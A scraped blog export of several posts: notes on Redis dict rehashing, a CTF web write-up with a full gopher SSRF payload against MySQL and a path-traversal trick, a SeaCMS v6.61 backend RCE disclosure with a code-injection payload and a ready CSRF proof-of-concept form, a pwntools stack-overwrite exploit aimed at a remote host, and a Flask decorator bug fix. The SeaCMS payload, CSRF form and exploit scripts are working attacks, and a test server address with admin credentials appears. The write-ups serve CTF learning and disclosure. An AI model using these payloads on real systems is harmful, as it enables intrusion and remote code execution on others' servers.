dict的rehash。通常情况下，所有的数据都是存在放dict的ht[0]中，ht[1]只在rehash的时候使用。 dict进行rehash操作的时候，将ht[0]中的所有数据rehash到ht[1]中。然后将ht[1]赋值给ht[0]， 并清空ht[1]。rehash操作我们会在后面详细看到。 */ dictht ht[2]; // 数据动态迁移的位置，如果rehashidx == -1说明当前没有执行rehash操作 long rehashidx; /* rehashing not in progress if rehashidx == -1 */ // 当前正在使用的迭代器的数量 int iterators; /* number of iterators currently running */&#125; dict; 四个结构体之间的关系： 散列函数 Thomas Wang’s 32 bit Mix dictIntHashFunction,对整形取hash MurmurHash2 by Austin Appleby dictGenHashFunction，对key值与指定长度取hash case insensitive hash function (based on djb hash) dictGenCaseHashFunction 对字符串进行hash Rehash操作 n步渐进式rehash操作，这是redis的一个亮点，能够将一次rehash分摊到多次数据请求中 _dictRehashStep,每调用一次Rehash一个bucket dictRehashMilliseconds 在一定时间内rehash多个bucket 上面两个函数都调用了dictRehash方法: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/* Performs N steps of incremental rehashing. Returns 1 if there are still * keys to move from the old to the new hash table, otherwise 0 is returned. * Note that a rehashing step consists in moving a bucket (that may have more * than one key as we use chaining) from the old to the new hash table. *//* 执行n步渐进式的rehash操作，如果还有key需要从旧表迁移到新表则返回1，否则返回0 */int dictRehash(dict *d, int n) &#123; if (!dictIsRehashing(d)) return 0; // n步渐进式的rehash操作就是每次只迁移哈希数组中的n个bucket while(n--) &#123; dictEntry *de, *nextde; /* Check if we already rehashed the whole table... */ // 检查是否对整个哈希表进行了rehash操作 if (d-&gt;ht[0].used == 0) &#123; zfree(d-&gt;ht[0].table); d-&gt;ht[0] = d-&gt;ht[1]; _dictReset(&amp;d-&gt;ht[1]); d-&gt;rehashidx = -1; return 0; &#125; /* Note that rehashidx can't overflow as we are sure there are more * elements because ht[0].used != 0 */ // rehashidx标记的是当前rehash操作进行到了ht[0]旧表的那个位置（下标），因此需要判断它是否操作ht[0]的长度 assert(d-&gt;ht[0].size &gt; (unsigned long)d-&gt;rehashidx); // 跳过ht[0]中前面为空的位置 while(d-&gt;ht[0].table[d-&gt;rehashidx] == NULL) d-&gt;rehashidx++; de = d-&gt;ht[0].table[d-&gt;rehashidx]; /* Move all the keys in this bucket from the old to the new hash HT */ // 下面的操作将每个节点（键值对）从ht[0]迁移到ht[1],此过程需要重新计算每个节点key的哈希值 while(de) &#123; unsigned int h; nextde = de-&gt;next; /* Get the index in the new hash table */ h = dictHashKey(d, de-&gt;key) &amp; d-&gt;ht[1].sizemask; de-&gt;next = d-&gt;ht[1].table[h]; d-&gt;ht[1].table[h] = de; d-&gt;ht[0].used--; d-&gt;ht[1].used++; de = nextde; &#125; d-&gt;ht[0].table[d-&gt;rehashidx] = NULL; d-&gt;rehashidx++; &#125; return 1;&#125;","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/categories/技术学习/"}],"tags":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/tags/技术学习/"},{"name":"cpp","slug":"cpp","permalink":"https://hexo.imagemlt.xyz/tags/cpp/"}]},{"title":"isitdtuctf web writeup","slug":"isitdtuctf-web-writeup","date":"2018-08-02T07:56:42.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/isitdtuctf-web-writeup/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/isitdtuctf-web-writeup/index.html","excerpt":"","text":"首发于安全客 https://www.anquanke.com/post/id/153258 28号的时候师傅们都在打real world ctf，看了一下real world ctf实在玩不动。。。于是就去玩了玩这个越南的ctf比赛的web部分的题目。整体而言这个比赛的web部分的题目偏中等难度，还是比较适合新手的一次练手，部分题目也有一定的新意。这里给出部分题目的writeup。 IZ 题目地址 打开题目可以获得题目源码：123456789101112131415161718192021222324252627282930313233343536373839 &lt;?phpinclude “config.php”;$number1 = rand(1,100000000000000);$number2 = rand(1,100000000000);$number3 = rand(1,100000000);$url = urldecode($_SERVER[‘REQUEST_URI’]);$url = parse_url($url, PHP_URL_QUERY);if (preg_match(“/_/i”, $url))&#123;die(“…”);&#125;if (preg_match(“/0/i”, $url))&#123;die(“…”);&#125;if (preg_match(“/w+/i”, $url))&#123;die(“…”);&#125;if(isset($GET[‘‘]) &amp;&amp; !empty($GET[‘‘]))&#123;$control = $GET[‘‘];if(!in_array($control, array(0,$number1)))&#123;die(“fail1”);&#125;if(!in_array($control, array(0,$number2)))&#123;die(“fail2”);&#125;if(!in_array($control, array(0,$number3)))&#123;die(“fail3”);&#125;echo $flag;&#125;show_source(__FILE__);?&gt; 可以看到题目的逻辑主要是获取query_string后用parse_url处理，处理后的$url再进行过滤，可以看到这里的过滤非常严所以想要绕过过滤还是有一定难度的。然而parse_url函数存在一个bug:当url的格式为http:/localhost///x.php?key=value的方式可以使其返回False这样就可以成功绕过之后的三次preg_match的过滤.绕过三次preg_match的过滤后程序又进行了三次in_array()判断，而三次in_array()的数组都存在0这样一个元素。而由php弱类型的特性，in_array()在判断时使用的是弱比较，当比较一个字符串和一个数字时默认会尝试把字符串转换为数字，如果字符串的第一个字符不是数字的话则该字符串会被转化成0.具体的转化规则可以参考php.net中的描述。因此最终的payload为： ///?_=a 访问即可获取flag。 Friss 题目地址 题目进去后是一个表单页面： 可以判断这个题目应该是要考ssrf相关的东西。于是首先测试file协议看能不能读到文件，输入file:///etc/passwd，结果题目返回：12345678910111213141516&lt;?phpinclude_once “config.php”;if (isset($_POST[‘url’])&amp;&amp;!empty($_POST[‘url’]))&#123; $url = $_POST[‘url’]; $content_url = getUrlContent($url);&#125;else&#123; $content_url = “”;&#125;if(isset($_GET[‘debug’]))&#123; show_source(FILE);&#125;?&gt; file://localhost/var/www/html/config.php1234567891011121314151617181920212223242526272829303132333435363738&lt;?php$hosts = “localhost”;$dbusername = “ssrf_user”;$dbpasswd = “”;$dbname = “ssrf”;$dbport = 3306;$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);function initdb($conn)&#123;$dbinit = “create table if not exists flag(secret varchar(100));”;if(mysqli_query($conn,$dbinit)) return 1;else return 0;&#125;function safe($url)&#123;$tmpurl = parse_url($url, PHP_URL_HOST);if($tmpurl != “localhost” and $tmpurl != “127.0.0.1”)&#123;var_dump($tmpurl);die(“&lt;h1&gt;Only access to localhost&lt;/h1&gt;”);&#125;return $url;&#125;function getUrlContent($url)&#123;$url = safe($url);$url = escapeshellarg($url);$pl = “curl “.$url;echo $pl;$content = shell_exec($pl);return $content;&#125;initdb($conn);?&gt; 可以看到在config.php中告诉我们flag在数据库中且给出了我们一个空密码的mysql账户。因此我们便可以联想到34c3ctf中的一道使用gopher协议攻击mysql的题目。 这里gopher协议的主要功能是可以直接发起socket连接获取数据，而且由于mysql这里给出的密码是空密码，因此可以通过gopher发起sql请求来获取数据。因此我们可以在本地用mysql搭建同样的环境，使用mysql客户端进行一次连接并获取执行读取flag的操作，用wireshark抓包后将抓取到的数据urlencode之后构造成符合gopher结构的payload即可获取到最后的flag。首先我们创建相同的用户和同样的表结构：然后给该用户此数据库的权限后使用该用户登入，获取该数据库内的flag信息，同时使用wireshark抓取lo上的包:wireshark中我们设置只显示客户端发送的数据包，以原始数据的形式显示将数据复制下来转换成urlencode的形式，构造gopher的链接为： gopher://127.0.0.1:3306/_%A8%00%00%01%85%A6%FF%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00ssrf_user%00%00mysql_native_password%00f%03_os%05Linux%0C_client_name%08libmysql%04_pid%0519500%0F_client_version%065.7.22%09_platform%06x86_64%0Cprogram_name%05mysql%21%00%00%00%03select%20%40%40version_comment%20limit%201%12%00%00%00%03SELECT%20DATABASE%28%29%05%00%00%00%02ssrf%0F%00%00%00%03show%20databases%0C%00%00%00%03show%20tables%06%00%00%00%04flag%00%13%00%00%00%03select%20%2A%20from%20flag%01%00%00%00%01 最后可以在回显中获取flag NNService 题目地址 先扫描查看是否存在源码泄露，发现存在robots.txt,提示存在源码bk/bk.zip,访问即可获取题目的源码。这里我们主要分析题目最后导致getflag的两个点，在index.controller.php中,首先分析更改个人信息的位置上传头像的点:12345678910111213141516171819202122232425262728if($_FILES[‘avatar’] and $_FILES[“avatar”][“error”] == 0)&#123; if((($_FILES[“avatar”][“type”] == “image/gif”) or ($_FILES[“avatar”][“type”] == “image/jpeg”) or ($_FILES[“avatar”][“type”] == “image/png”)) and $_FILES[‘avatar’][‘size’]&lt;65535)&#123; $info=getimagesize($_FILES[‘avatar’][‘tmp_name’]); if(@is_array($info) and array_key_exists(‘mime’,$info))&#123; $type=explode(‘/‘,$info[‘mime’])[1]; $filepath=$this-&gt;user-&gt;getuser().”.”.$type; $filename=”uploads/“.$filepath; if(is_uploaded_file($_FILES[‘avatar’][‘tmp_name’]))&#123; $this-&gt;user-&gt;edit(“avatar”,array($filepath,$type)); if(strpos($filepath,”..”) !== false) &#123; die(“Hacker, cut please!”); &#125; else if(move_uploaded_file($_FILES[‘avatar’][‘tmp_name’], $filename))&#123; quit_and_refresh(‘Upload success!’,’edit’); &#125; quit_and_refresh(‘Success!’,’edit’); &#125; &#125;else &#123; //TODO！report it！ quit(‘Only allow gif/jpeg/png files smaller than 64kb!’); &#125; &#125; else&#123; //TODO！report it！ quit(‘Only allow gif/jpeg/png files smaller than 64kb!’); &#125; &#125; 分析代码流程，首先判断图片的mime类型，然后使用getimagesize获取图片的信息，之后从getimagesize获取到的图片信息中获取图片的后缀名，之后可以看到$filepath=$this-&gt;user-&gt;getuser().”.”.$type;，将用户名与图片名称拼接为图片上传路径，后调用$this-&gt;user-&gt;edit(“avatar”,array($filepath,$type));,跟到user.class.php文件中可以发现这一步的操作实质是将文件名写入了数据库中。之后使用强等于判断文件名中是否含有..，如果含有..则终止整个流程，否则将移动上传的图片到upload文件夹下，命名为用户名.文件类型;然后我们再分析export处的源码：123456789101112131415161718192021222324252627282930313233343536373839404142public function export()&#123; $avatar=$this-&gt;user-&gt;getavatar(); if(substr($avatar,0,5)!==”data:”)&#123; $fileavatar=substr($this-&gt;user-&gt;getavatar(),1); $avatar = “uploads/“.$fileavatar; if(file_exists($avatar) and filesize($avatar)&amp;lt;65535 and strpos($fileavatar,\"..\")==false)&#123; $data=file_get_contents($avatar); if(!$this-&amp;gt;user-&amp;gt;updateavatar($data)) quit('Something error!'); &#125; else&#123; //TODO！report it！ $out=\"Your avatar is invalid, so we reported it\".\"&amp;lt;/p&amp;gt;\"; include(\"templates/error.html\"); die(\"&amp;lt;br&amp;gt;\"); &#125;&#125;$article=$this-&amp;gt;user-&amp;gt;getarticle();$data=\"\";for($i=0;$i&amp;lt;count($article);$i++)&#123; if($i!=count($article)-1)&#123; $data.=$article[$i][2].\"rn\"; $data.=$article[$i][3].\"n\"; $data.=\"----------n\"; &#125; else&#123; $data.=$article[$i][2].\"rn\"; $data.=$article[$i][3].\"n\"; &#125;&#125;$data.=\"==========n\";$avatar=$this-&amp;gt;user-&amp;gt;getavatar(1);$data.=base64_encode($avatar[1]).\"n\";$data.=$avatar[3];header(\"Content-type: application/octet-stream\");header(\"Content-Transfer-Encoding: binary\");header(\"Accept-Ranges: bytes\");header(\"Content-Length: \".strlen($data));header(\"Content-Disposition: attachment; filename=\"\".$this-&amp;gt;user-&amp;gt;getuser().\"\"\");echo $data;&#125; 可以看到export处的代码在进行导出时，首先调用$avatar=$this-&gt;user-&gt;getavatar();获取头像的信息，我们跟到user.class.php中可以发现这一步操作便是将我们之前写入数据库的文件名取出。然后这里的代码对文件进行判断，判断文件是否存在，文件大小是否小于65535，以及使用弱等于判断文件名中是否含有..。之后便获取文件内容并base64加密后拼接上之前的一些信息输出文件。这里我们可以看到主要的漏洞点在于写入数据库的操作在判断文件名是否包含..之前，因此我们即使文件名中包含了..最后不合法的文件名也会被写入数据库。而在之后export处读取到文件名后使用的是弱等于判断： strpos($fileavatar,”..”)==false 然而当我们构造类似../flag.php的字符串时，strpos返回..出现的位置0，而0==false成立。因此我们便可以成功实现目录穿越。但是这里还有一点：我们的文件名的生成方式是用户名.文件类型,文件类型由getimagesize()函数获得，因此只能是图片文件的后缀名，那么怎样才能截断这个后缀名从而成功获取flag.php的源码？这里我们查看之前下载到的源码中的sql文件:12345678910111213141516171819202122CREATE TABLE IF NOT EXISTS users ( id int(32) primary key auto_increment, username varchar(100) UNIQUE KEY, nickname varchar(100) UNIQUE KEY, password varchar(32), email varchar(100) UNIQUE KEY);CREATE TABLE IF NOT EXISTS articles (id int(32) primary key auto_increment,user_id int(32),title varchar(100),content varchar(500));CREATE TABLE IF NOT EXISTS avatar (id int(32) primary key auto_increment,data blob,user_id int(32) UNIQUE KEY,filepath varchar(100),photo_type varchar(20)); 可以看到这里的sql文件中限制了图片路径filepath字段的长度最多为100，用户名username的长度也最多为100。这里便可以联想到mysql的一个性质：当mysql开启宽松模式时，在INSERT的时候，如果你插入的字符超出了MySQL的字段长度，MySQL会自动截断到最大长度然后插入，并不会出错。，具体可以参考这篇文章：http://www.91ri.org/5963.html因此我们如果注册长度为100的用户名，在将文件名写入数据库时，用户名之后拼接的后缀便会被截断从而无法进入数据库，因此便实现了我们对文件的控制。最后解题的方法为： 注册用户名：..//////////////////////////////////////////////////////////////////////////////////////////flag.phpedit处随意上传一张图片export处导出数据，便可获得flag。 总结这场比赛整体难度适中，比较适合新手用于提高自己的水平。此外比赛源码已经上传到https://github.com/susers/Writeups上，欢迎大家star与pull request！ 参考资料http://php.net/manual/zh/language.operators.comparison.phphttp://www.freebuf.com/articles/web/159342.htmlhttps://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2http://www.91ri.org/5963.html","categories":[{"name":"Ctf","slug":"Ctf","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/"},{"name":"web","slug":"Ctf/web","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/web/"}],"tags":[{"name":"Ctf","slug":"Ctf","permalink":"https://hexo.imagemlt.xyz/tags/Ctf/"}]},{"title":"seacms backend getshell","slug":"seacms-backend-getshell","date":"2018-07-18T03:30:58.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/seacms-backend-getshell/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/seacms-backend-getshell/index.html","excerpt":"","text":"backend RCE in the latest version of SeaCMS(v6.61)In SeaCMS’s admin platform, just in the page of publishing movies,due to the low limitation of the code injected in the picture’s url,we can execute random code to getshell.though there are some way’s in the /include/main.class to limit the usage of the code,we can find ways to bypass it.So How does this vul be triggerd? here are some Steps: Firstly login to the admin panel, in this case the admin directory is adjusted to /backend. Secondly add a movie and set it’s pictrue address as {if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//}{end if} After adding it visit /details/index.php?1.html&amp;m=admin&amp;a=assert&amp;b=phpinfo();you can find phpinfo() is executed.here 1.html refers to the id of the video you have just added.In my case, the video’s id is 2 so I executed as 2.html. Or you can just visit /search.php?searchtype=5&amp;tid=0&amp;a=assert&amp;b=phpinfo();or any other places that display the video’s pic you have just added. Also in the adding movie page it has no csrf protection so we can use CSRF to attacked it.csrf poc is here:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;!-- adjust action to your url --&gt; &lt;form action=\"http://127.0.0.1/seacms/backend/admin_video.php?action=save&amp;acttype=add\" method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;commend\" value=\"0\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;name\" value=\"getshell\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;enname\" value=\"ceshi\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;color\" value=\"&amp;#35;FF0000\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;type\" value=\"5\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;state\" value=\"5\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;pic\" value=\"&#123;if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//&#125;&#123;end if&#125;\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;spic\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;gpic\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;actor\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;director\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;commend\" value=\"0\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;note\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;tags\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"select3\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;publishyear\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"select2\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;lang\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"select1\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;publisharea\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"select4\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;ver\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;hit\" value=\"0\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;monthhit\" value=\"0\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;weekhit\" value=\"0\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;dayhit\" value=\"0\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;len\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;total\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;nickname\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;company\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;tvs\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;douban\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;mtime\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;imdb\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;score\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;scorenum\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;longtxt\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;money\" value=\"0\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;psd\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;playfrom&amp;#91;1&amp;#93;\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;playurl&amp;#91;1&amp;#93;\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"m&amp;#95;downfrom&amp;#91;1&amp;#93;\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"m&amp;#95;downurl&amp;#91;1&amp;#93;\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"v&amp;#95;content\" value=\"\" /&gt; &lt;input type=\"hidden\" name=\"Submit\" value=\"�&amp;#161;&amp;#174;�&amp;#174;&amp;#154;�&amp;#143;&amp;#144;浜&amp;#164;\" /&gt; &lt;input type=\"submit\" value=\"Submit request\" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; you can test this vul at http://111.230.11.248:10089/backend/,and the username and password is admin|admin.","categories":[{"name":"Ctf","slug":"Ctf","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/"},{"name":"web","slug":"Ctf/web","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/web/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://hexo.imagemlt.xyz/tags/Security/"}]},{"title":"pwn的初体验-qctf Xman-stack2 writeup","slug":"pwn的初体验-qctf-Xman-stack2-writeup","date":"2018-07-15T14:55:05.000Z","updated":"2019-02-02T00:29:25.548Z","comments":true,"path":"post/pwn的初体验-qctf-Xman-stack2-writeup/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/pwn的初体验-qctf-Xman-stack2-writeup/index.html","excerpt":"","text":"昨天去打了打QCTF，水了3道web题目后便草草收场。表示这场比赛真的只是一场萌新赛吗。。。。由于队伍里面向来缺pwn手，所以便计划把这场比赛的pwn题目也做一下练练手，限于水平太菜也就做了个stack2这道题。 分析程序利用点首先 checksec查看程序的保护情况可以卡暗道开启了栈不可执行保护和CANARY。先把程序拖到IDA里面然后F5大法好。。。得到main函数的伪代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax unsigned int v5; // [esp+18h] [ebp-90h] unsigned int v6; // [esp+1Ch] [ebp-8Ch] int v7; // [esp+20h] [ebp-88h] unsigned int j; // [esp+24h] [ebp-84h] int v9; // [esp+28h] [ebp-80h] unsigned int i; // [esp+2Ch] [ebp-7Ch] unsigned int k; // [esp+30h] [ebp-78h] unsigned int l; // [esp+34h] [ebp-74h] char v13[100]; // [esp+38h] [ebp-70h] unsigned int v14; // [esp+9Ch] [ebp-Ch] v14 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); v9 = 0; puts(\"***********************************************************\"); puts(\"* An easy calc *\"); puts(\"*Give me your numbers and I will return to you an average *\"); puts(\"*(0 &lt;= x &lt; 256) *\"); puts(\"***********************************************************\"); puts(\"How many numbers you have:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"Give me your numbers\"); for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 99; ++i ) &#123; __isoc99_scanf(\"%d\", &amp;v7); v13[i] = v7; &#125; for ( j = v5; ; printf(\"average is %.2lf\\n\", (double)((long double)v9 / (double)j)) ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts(\"1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit\"); __isoc99_scanf(\"%d\", &amp;v6); if ( v6 != 2 ) break; puts(\"Give me your number\"); __isoc99_scanf(\"%d\", &amp;v7); if ( j &lt;= 0x63 ) &#123; v3 = j++; v13[v3] = v7; &#125; &#125; if ( v6 &gt; 2 ) break; if ( v6 != 1 ) return 0; puts(\"id\\t\\tnumber\"); for ( k = 0; k &lt; j; ++k ) printf(\"%d\\t\\t%d\\n\", k, v13[k]); &#125; if ( v6 != 3 ) break; puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; &#125; if ( v6 != 4 ) break; v9 = 0; for ( l = 0; l &lt; j; ++l ) v9 += v13[l]; &#125; return 0;&#125; 分析程序可以看出程序的逻辑大体是输入一堆数，然后可以求平均值，也可以添加数字，或者更改某一位。数字默认被存入一个数组中。其中在更改某一位数字的操作中可以看到并没有被传入的下标做检测，这就导致了我们可以在任意位置写入数据，从而更改掉main函数的返回地址从而实现getshell。而且这里存在一个hackhere函数:1234int hackhere()&#123; return system(\"/bin/bash\");&#125; 所以最初的尝试是将retaddr覆盖为hackhere函数的地址。 分析偏移量这里分析偏移量采用了ida动态调试的方法，在main函数的retn处下断点。为了方便找到数组的地址，在调试时先输入4个数字1,2,3,4，然后在stack view中寻找数组的首地址。执行到断点处stack view视图默认指向esp的位置，可以从而确定retaddr：这里的retaddr为0xffcd968c向上寻找看是否存在某段内容为04030201，即可找到v13数组的首地址：可以看到数组地址为0xffcd9608,数组相对retaddr的偏移位数为0xffcd968c-0xffcd9608=132,所以只要覆盖v13[132]至v13[135]即可。确定hackhere的地址为0x0804859B,所以只需覆盖v13[132]至v13[135]为0x9b,0x85,0x04,0x08.本地测试用这样的方法可成功getshell。 远程的问题然而远程测试则提示bash not found.原来目标机器上并不存在bash。因此想要getshell就只能通过调用_system来实现最终的getshell。而这里的/bin/sh可以从/bin/bash中获得，即/bin/bash的倒数二位。因此最后打通远端服务器的payload为:123456from pwn import *r = remote(\"47.96.239.28\", '2333')r.sendline('1\\n5\\n3\\n132\\n80\\n3\\n133\\n132\\n3\\n134\\n4\\n3\\n135\\n8\\n3\\n140\\n135\\n3\\n141\\n137\\n3\\n142\\n4\\n3\\n143\\n8')r.sendline('5')r.interactive() 后记对于pwn菜鸡来说一定要熟悉程序执行的原理才行，另外ida远程调试也是一个很好的办法，更加形象化。另外这里的ida是在wine下运行的portable版本，亲测没有什么大bug。keep calm and carry on！","categories":[{"name":"Ctf","slug":"Ctf","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/"},{"name":"web","slug":"Ctf/web","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/web/"}],"tags":[{"name":"Ctf","slug":"Ctf","permalink":"https://hexo.imagemlt.xyz/tags/Ctf/"}]},{"title":"flask自定义decorator的坑点","slug":"flask自定义decorator的坑点","date":"2018-06-27T17:23:54.000Z","updated":"2019-02-02T00:29:25.452Z","comments":true,"path":"post/flask自定义decorator的坑点/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/flask自定义decorator的坑点/index.html","excerpt":"","text":"flask自定义decorator的坑点在一次开发中需要做一个权限验证的修饰器，由于之前并没有太多的flask编程经验，没有写过这种修饰器，于是便直接写出了以下的代码： 123456def is_admin(func): def wrapper(*args,**kargs): if not session['is_admin']: return redirect('/admin/login') return func(args,kargs) return wrapper 写完后直接运行报错： 12existing endpoint function: %s&apos; % endpoint)AssertionError: View function mapping is overwriting an existing endpoint function: admin.wrapper 一开始的时候百思不得其解，并不懂这个错误出现的原因。后来联系报错的提示为已经存在了一个注册过的函数admin.wrapper.可以判断为，经过修饰器修饰后，当传入flask自己的修饰器后修饰器获取到的当前函数的名称为wrapper，所以所有被这个修饰器修饰过得函数传入flask的修饰器中获取到的函数名都是wrapper，因此产生了冲突从而报错。 查看报错的地方的源码，位于app.py中： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798def add_url_rule(self, rule, endpoint=None, view_func=None, provide_automatic_options=None, **options): \"\"\"Connects a URL rule. Works exactly like the :meth:`route` decorator. If a view_func is provided it will be registered with the endpoint. Basically this example:: @app.route('/') def index(): pass Is equivalent to the following:: def index(): pass app.add_url_rule('/', 'index', index) If the view_func is not provided you will need to connect the endpoint to a view function like so:: app.view_functions['index'] = index Internally :meth:`route` invokes :meth:`add_url_rule` so if you want to customize the behavior via subclassing you only need to change this method. For more information refer to :ref:`url-route-registrations`. .. versionchanged:: 0.2 `view_func` parameter added. .. versionchanged:: 0.6 ``OPTIONS`` is added automatically as method. :param rule: the URL rule as string :param endpoint: the endpoint for the registered URL rule. Flask itself assumes the name of the view function as endpoint :param view_func: the function to call when serving a request to the provided endpoint :param provide_automatic_options: controls whether the ``OPTIONS`` method should be added automatically. This can also be controlled by setting the ``view_func.provide_automatic_options = False`` before adding the rule. :param options: the options to be forwarded to the underlying :class:`~werkzeug.routing.Rule` object. A change to Werkzeug is handling of method options. methods is a list of methods this rule should be limited to (``GET``, ``POST`` etc.). By default a rule just listens for ``GET`` (and implicitly ``HEAD``). Starting with Flask 0.6, ``OPTIONS`` is implicitly added and handled by the standard request handling. \"\"\" if endpoint is None: endpoint = _endpoint_from_view_func(view_func) options['endpoint'] = endpoint methods = options.pop('methods', None) # if the methods are not given and the view_func object knows its # methods we can use that instead. If neither exists, we go with # a tuple of only ``GET`` as default. if methods is None: methods = getattr(view_func, 'methods', None) or ('GET',) if isinstance(methods, string_types): raise TypeError('Allowed methods have to be iterables of strings, ' 'for example: @app.route(..., methods=[\"POST\"])') methods = set(item.upper() for item in methods) # Methods that should always be added required_methods = set(getattr(view_func, 'required_methods', ())) # starting with Flask 0.8 the view_func object can disable and # force-enable the automatic options handling. if provide_automatic_options is None: provide_automatic_options = getattr(view_func, 'provide_automatic_options', None) if provide_automatic_options is None: if 'OPTIONS' not in methods: provide_automatic_options = True required_methods.add('OPTIONS') else: provide_automatic_options = False # Add the required methods now. methods |= required_methods rule = self.url_rule_class(rule, methods=methods, **options) rule.provide_automatic_options = provide_automatic_options self.url_map.add(rule) if view_func is not None: old_func = self.view_functions.get(endpoint) if old_func is not None and old_func != view_func: raise AssertionError('View function mapping is overwriting an ' 'existing endpoint function: %s' % endpoint) self.view_functions[endpoint] = view_func 这里的view_functions是一个dict，存储endpoint-view_func键值对。而endpoint是指一个标记各个url的一个字符串，通常为函数的名称。endpoint与不同的函数一一对应。出错的原因在于相同的endpoint被指向了两次，且指向的函数不同，但是这两个不同的函数却拥有相同的名字name，因此便对应了相同的endpoint。所以便导致了重复出现的错误。 那么怎么解决这个问题？这里使用了一个叫做functools的库中定义的一个修饰器@functool.wraps.更改后的代码为:1234567def is_admin(func): @functools.wraps(func) def wrapper(*args,**kargs): if not session['is_admin']: return redirect('/admin/login') return func(args,kargs) return wrapper 再次调试可以看到这次程序运行后对应的函数的name不同，从而没有再出现bug。再次调试可以发现最后的函数的name与对应的endpoint值均不同。 注：@functools.wraps(func)的作用就是保留原有函数的名称和docstring 参考记录一次使用Flask开发过程中的bug 